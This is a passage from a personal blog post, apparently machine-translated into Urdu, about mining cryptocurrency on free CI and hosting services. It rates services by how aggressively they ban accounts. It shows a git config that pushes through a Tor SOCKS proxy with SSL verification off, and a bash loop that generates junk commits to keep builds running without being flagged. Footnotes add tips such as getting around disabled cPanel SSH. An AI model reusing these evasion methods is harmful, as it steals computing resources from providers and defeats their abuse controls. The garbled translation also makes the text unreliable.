style=text-align:center>سیمفور۔<td style=color:green;text-align:center>اچھی<td style=color:green;text-align:center>اچھی<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>ڈاکر۔<td style=color:#ff0;text-align:center>میڈیم<td style=color:#ff0;text-align:center>میڈیم<td style=color:green;text-align:center>اچھی<tr><td style=text-align:center>کوے<td style=color:green;text-align:center>اچھی<td style=color:#ff0;text-align:center>میڈیم<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>کوڈ فریش۔<td style=color:red;text-align:center>برا<td style=color:green;text-align:center>اچھی<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>ورکر۔<td style=color:#ff0;text-align:center>میڈیم<td style=color:#ff0;text-align:center>میڈیم<td style=color:red;text-align:center>برا<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>میڈیم<td style=color:#ff0;text-align:center>میڈیم<td style=color:red;text-align:center>برا<tr><td style=text-align:center>مسلسل پی ایچ پی<td style=color:red;text-align:center>برا<td style=color:#ff0;text-align:center>میڈیم<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>بڈی<td style=color:red;text-align:center>برا<td style=color:red;text-align:center>برا<td style=color:red;text-align:center>برا<tr><td style=text-align:center>ڈرون<td style=color:red;text-align:center>برا<td style=color:green;text-align:center>اچھی<td style=color:red;text-align:center>برا<tr><td style=text-align:center>درخواست دینے والا۔<td style=color:red;text-align:center>برا<td style=color:#ff0;text-align:center>میڈیم<td style=color:red;text-align:center>برا<tr><td style=text-align:center>نیور کوڈ۔<td style=color:red;text-align:center>برا<td style=color:green;text-align:center>اچھی<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>زیسٹ/ورسل۔<td style=color:red;text-align:center>برا<td style=color:green;text-align:center>اچھی<td style=color:red;text-align:center>برا</table><p>اس تناظر میں ، a<span style=color:green> اچھی</span> کنفیگریشن کا مطلب ہے کہ اس کو تشکیل دینے میں زیادہ وقت نہیں لگا۔<code>ci</code> کان کنی کے عمل کے لیے نوکری (جیسے ذخیرہ کرنے والی ڈاٹ فائل کی بجائے ویب ڈیش بورڈ پر انحصار کرنے والی تمام خدمات ایک کام کا کام تھیں)<span style=color:red> برا</span><code>ban-hammer</code> اس کا مطلب یہ ہے کہ سروس میں رجسٹر کرنا مشکل تھا ، یا یہ کہ اکاؤنٹس پر زیادہ جارحانہ پابندی عائد ہوگی۔<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> بٹ رائز۔</a> کسی پروجیکٹ کو ترتیب دینے کی ضرورت ہوتی ہے ، ماحول ، ٹارگٹ فن تعمیر ، عملدرآمد کا عمل اور دیگر چیزوں کا اندازہ لگانے کے لیے ، ایک بلڈ سیٹ اپ کرنے میں بہت وقت لگتا تھا لہذا اسے ترتیب میں خراب درجہ ملا۔<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> مسلسل پی ایچ پی</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> بڈی</a> ، [کوڈفریش] کے پاس دستی غیر اعلانیہ ترتیب دینے کے بہت سے مراحل تھے۔<p>[Azure-pipelines] جیسی خدمات ،<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> ورکر۔</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> بڈی</a> اکاؤنٹس پر شیڈو پابندی لگاتا ہے ، سائے پر پابندی خراب ہے ، کیونکہ وہ آپ کو اندازہ لگاتے ہیں کہ آپ کی ترتیب میں کچھ غلط ہے یا نہیں۔ کچھ خدمات کے ذریعے آپ پابندی کی وجہ کا اندازہ لگا سکتے ہیں (بہت زیادہ آپ کی تعمیر میں بہت زیادہ وقت لگتا ہے ، یا آپ نے ایک مختصر عرصے میں بہت زیادہ بار تعمیر کیا ہے) ، [Azure-pipelines] کی طرح کچھ دوسروں کے لیے میں فرض کرتا ہوں کہ انہوں نے کسی قسم کی فنگر پرنٹ لگائی ہے صارف کے ذخیروں پر پابندی کے باوجود وسائل کے کسی بھی غلط استعمال کے بغیر ، آزور اور ورسل پر بھی پابندی ہے<code>DNS</code> پبلک بلڈ مشینوں میں رسائی ، تاکہ یہ اضافی رگڑ ہو جس کو ایڈہاک ٹنل سے دور کرنے کی ضرورت ہے۔<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> ڈرون</a> پورے 16+ کور پروسیسر تک رسائی دی لیکن 2 تعمیرات کے بعد پابندی ختم کردی۔<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> کوڈ شپ</a> طاقتور بلڈ میزبانوں تک بھی رسائی دیتا ہے اور ڈرون کی طرح جارحانہ طور پر پابندی نہیں لگائی۔<p>میری پسندیدہ خدمات منافع کی وجہ سے نہیں بلکہ آسانی اور سہولت کے لیے تھیں (دیگر منصوبوں کے ساتھ بھی)۔<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> ٹریوس۔</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> سیمفور۔</a> اور<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> ڈاکر حب۔</a> . ٹریوس معیاری CI کی طرح ہے اور بہت لچکدار ہے ، سیمافور واحد ہے۔<code>DSL</code> کے لیے<code>CI</code> یہ قابل رسائی اور اچھی لگ رہی تھی حالانکہ دوسرے UIs کی طرح صرف سپیگٹیفائیڈ چیک باکسز کی ایک نہ ختم ہونے والی ترتیب کی بجائے ، اور ڈوکر صرف ڈوکر فائلوں کو بنانے کے لیے نقشہ بنانے کی سادگی کے لیے۔<h3 id=builds_configs><a class=header-anchor href=#builds_configs> تشکیلات بناتا ہے۔</a></h3><p>تعمیرات کو یا تو ویب سروسز کے ذریعہ پیش کردہ کرون جابز یا گٹ کمٹس کے ذریعے متحرک کیا گیا تھا۔ لہذا آپ کو تمام گٹ کمیٹس کو سنبھالنے کے لیے رسائی ٹوکن یا ایس ایس ایچ کیز کے گندگی کا ٹریک رکھنا پڑا۔ یہ بھی ضروری تھا کہ زیادہ فضول کام نہ کریں ، اور گٹ کو ترتیب دینے والے ذخیروں کی طرف دھکیلتے وقت پراکسی استعمال کریں:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>گٹ ہوسٹنگ سروسز کا استعمال کرتے ہوئے ، گیتھب پابندیوں کے بارے میں ایک زیادہ مکمل رہا ہے ، لیکن ان کو صرف سی آئی سروسز ایڈمنز کی جانب سے غلط استعمال کی رپورٹس پر پھانسی دی گئی تھی ، جب میں نے سی آئی ٹرائل (لاپرواہی) کی تجدید کرنے کی کوشش کی تو گٹ لیب نے ایک بار پابندی کی لہر کو نافذ کیا۔ مجھے بٹ بکٹ اکاؤنٹ پر کبھی پابندی نہیں ملی۔ گٹ کمٹس کو (زبردستی) کرنے کے لیے ، ہمارے پاس ایک طویل چلنے والا لوپ ہے جو گٹ ذخیرے کو دوبارہ ٹیگ کرتا ہے:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>یہ ممکن ہو سکتا ہے کہ اس طرح زور لگانا کوئی ایسی چیز نہیں ہے جسے گیتھب بہت پسند کرتا ہے اور یہ اکاؤنٹس کو جھنڈا لگانے کی وجہ بن سکتا ہے۔ ٹیگر فنکشن جو مختلف کاموں کو طاقت سے آگے بڑھانے کا کام سونپا گیا ہے ، ایک ویب سائٹ (جسے آپ بہت آسانی سے دیکھ سکتے ہیں) استعمال کرتے ہیں جو کچھ بے ترتیب کام کرتا ہے۔ مجھے یقین نہیں ہے کہ اس سے کتنی مدد ملتی ہے ، کیونکہ کمیٹس کا مواد ہی میرے معاملے کے لیے واضح طور پر مشکوک ہے۔ اور اس نے مجھے ایک بار گدی میں بھی کاٹ لیا ، چونکہ اس کمانڈ سے واپس آنے والے کمٹ میں حلف کے الفاظ شامل ہوسکتے ہیں ، میرے ایک کمٹمنٹ کو ایک ٹویٹر بوٹ نے اٹھایا جو کہ گٹ کمیٹس کو قسموں کے الفاظ سے ٹریک کرتا ہے! میں نے اس واقعے کے بعد برے الفاظ کے لیے بلیک لسٹ شامل کی۔<p>میں نے واقعی گٹ کمٹس اور مبہم گٹ ذخیروں میں تلاش نہیں کیا ہے۔ صرف ایک مثال جہاں میں زیادہ وسیع ذخیرہ استعمال کر رہا تھا وہ بٹریس کے ساتھ تھا کیونکہ اگر آپ ماحول کو نہیں پہچانتے تو آپ بلڈ سیٹ نہیں کر سکتے تھے (جیسے موبائل ایپس) ، لیکن پھر بھی کوئی گردش نہیں تھی اور یہ ہمیشہ ایک جیسا ہی تھا ذخیرہ ، تلاش کرنا کافی آسان ہے۔<p>مجموعی طور پر ، اگر مجھے اپنے وقت کے ارد گرد گھنٹی کا وکر لگانا پڑا۔<em> بغیر</em>تمام آزمائشی خدمات کے دوران اکاؤنٹس پر پابندی لگانا ، مرکز کے ساتھ تقریبا 1 1 گھنٹہ کی تعمیر کا دورانیہ ہوگا ، فی دن ایک بار۔ سی پی یو کورز کے لیے ، ایک دو جھوٹے (ڈرون کی طرح) کے لیے ، زیادہ تر سروسز توقع کرتی ہیں کہ آپ کو دیے گئے وسائل کی مکمل مقدار استعمال کی جائے گی کیونکہ عمارتیں VMs یا کنٹینر کے اندر چلائی جاتی ہیں۔ سی پی یو کو سیر کرتا ہے ، لہذا اس میں شماریاتی مطابقت نہیں ہے۔ بدیہی طور پر روزانہ ایک تعمیر وہی ہے جو اوسط ڈویلپر کرے گا ، لہذا اگر آپ وسط سے دور ہو جاتے ہیں تو آپ کو بلند پرچموں کی توقع کرنی چاہیے ، اور زیادتی پر زور دینا کبھی بھی اچھی طرح ختم نہیں ہوتا ہے۔<h2 id=conclusions><a class=header-anchor href=#conclusions> نتائج</a></h2><p>کیا یہ اس کے قابل تھا؟ نیٹ ورکنگ کے حصے یقینی طور پر دلچسپ تھے ، کھاتوں کی رجسٹریشن سے نمٹنا ظاہر ہے کہ سب سے خراب حصہ تھا ، نوبوڈیز لامتناہی تصدیقی ای میلز پر کلک کرنا پسند کرتی ہیں اور ذہن کو بے حس کرنے والے UI طریقہ کار کو دہراتے ہیں۔ اسپام آٹومیشن سافٹ ویئر لکھنا بھی بورنگ ہے (کیونکہ آپ زیادہ تر گونگے APIs پر گھس رہے ہیں) ، اور اس مفروضے کے ساتھ (اور حقیقت یہ ہے کہ یہ کبھی کوئی سنجیدہ بات نہیں تھی) میں نے کبھی اس پر غور بھی نہیں کیا۔ کیا یہ منافع بخش تھا؟ اپنے عروج پر یہ کچھ اس طرح پہنچ رہا تھا۔<code>300$</code> فی مہینہ ، شاید وینزویلا کے لیے کافی ہے ، واقعی میرے لیے نہیں :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> بدمزاج سیسڈمین</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>اگرچہ یہ رازداری کے بہت سے مفروضوں کو توڑ دے گا ، مجھے یقین ہے کہ ان میں سے بیشتر جب بھی کوئی آنے والا مسئلہ ہوتا ہے صرف اندر جھانکتا ہے ، لیکن یہ صرف کنٹینر پر مبنی رن ٹائمز کا مسئلہ ہے ، جبکہ وی ایم بہت زیادہ بلیک باکس ہیں۔</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>منیرو نوڈ میں بنائے گئے کان کن کو کچھ پس منظر دوست بنانے کے لیے کچھ کام ملا ، لیکن xmrig کی تقسیم کبھی بھی پس منظر دوستی پر مرکوز نہیں تھی۔</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>کچھ تالاب مختلف کنکشن بندرگاہوں پر مختلف مشکلات پیش کرتے ہیں ، اور کام کی دشواری کو کان کن کے جمع کرائے گئے حصص سے ہم آہنگ کرتے ہیں ، لیکن پراکسی کی گرانولریٹی اب بھی زیادہ آسان تھی ، کیونکہ یہ پول کو روکتا ہے<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> بند کردو</a> (حالانکہ ہم نے کبھی بھی پول تبدیل نہیں کیے)</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>یہ خوش نہیں تھا جب کنفیگ اچانک نمودار ہوئی اور فائل سسٹم سے غائب ہوگئی۔</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>ہم کے بارے میں بات نہیں کرتے<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> سٹرٹم پروٹوکول</a> چونکہ ہمیں صرف جو کچھ بھی لاگو ہوتا ہے اس سے نمٹنا ہے۔<em> دونوں</em> پول اور کان کن ... جو کہ عام طور پر کم سے کم ہوتا ہے ، اور ممکنہ طور پر غیر معیاری توسیع کے ساتھ۔</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>کبھی بھی مکمل باز نہ آؤ :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>میں نے دریافت نہیں کیا کہ کیا ہوتا ہے جب کوئی عمل رن ٹائم پر اضافی فعالیت کو لوڈ کرتا ہے ، کیونکہ دانا عملدرآمد کے میموری لے آؤٹ میں پتے کی تلاش کرے گا ، جو فائل سسٹم تک رسائی حاصل کرے گا اور ممکنہ طور پر حادثے کا سبب بنے گا۔</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>حدیں صوابدیدی ہیں ، سی پی یو کا وقت ایک سیکنڈ سے کم ہے ، میموری 128M سے کم ہے ، آؤٹ باؤنڈ کنکشن بلاک ہیں۔</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>تھوڑا سا صبر کے ساتھ آپ اپنے cpanel اکاؤنٹ کی جگہ کے ارد گرد بوٹسٹریپڈ ماحول پر مکمل ssh مثال بھی چلا سکتے ہیں ،<em> بغیر</em> cpanel بلٹ ان SSH تک رسائی حاصل کرنا جو ہوسٹنگ فراہم کرنے والوں کے ذریعے غیر فعال ہو جاتا ہے۔</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>اوپن شفٹ 1 سال کے مفت درجے سے 3 ماہ سے 1 ماہ تک چلا گیا ، فون کی تصدیق کی ضرورت شروع ہوئی ، میں اس بات کی ضمانت دے سکتا ہوں کہ میں صرف ان کی خدمات کو غلط استعمال کرنے والا نہیں تھا۔</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>ہیروکو فری ٹیر کنٹینرز وسائل میں کافی فراخ ہیں ، وہ 4c/8t (ورچوئل) سی پی یو ، کافی مقدار میں رام اور بڑا اسٹوریج فراہم کرتے ہیں (جو کہ ڈائنو شٹ ڈاؤن پر مستقل اور ضائع نہیں ہوتا)۔</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>وہ متعدد پابندیوں کے بعد رجسٹریشن کے سخت قوانین کو شامل کرتے ہیں ، شاید میں نے اس میں حصہ لیا ہو۔</table><p><div id=post-tags-list>پوسٹ ٹیگز: <span class=post-tag><a href=https://www.unto.re/tag/crypto> کرپٹو</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> نیٹ</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> خول</a></span></div><div class=page-foot><div class=copyright>21 اگست ، 2021۔</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - کی طرف سے طاقت<a href=https://github.com/tlienart/Franklin.jl> فرینکلن</a></div><div class=page__footer-links>- <ul><li><a href=/ur/sitemapxml> سائٹ کا نقشہ</a></li> | <li><a href=/ur/tag> ٹیگز۔</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> آر ایس ایس</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>